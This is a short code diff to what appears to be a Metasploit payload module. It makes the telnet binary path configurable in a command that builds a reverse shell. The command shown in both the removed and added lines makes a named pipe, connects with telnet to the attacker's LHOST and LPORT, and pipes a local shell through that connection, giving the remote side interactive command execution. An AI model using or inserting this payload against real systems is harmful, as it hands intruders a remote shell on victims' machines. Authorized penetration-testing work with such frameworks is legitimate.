@@ -34,6 +34,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('TELNET_PATH', [true, 'The path to Telnet', 'telnet'])
+    ])
   end
 
   #
@@ -49,6 +52,6 @@ module MetasploitModule
   #
   def command_string
     pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
-    "mkfifo #{pipe_name} && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
+    "mkfifo #{pipe_name} && #{datastore['TELNET_PATH']} -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
   end
 end
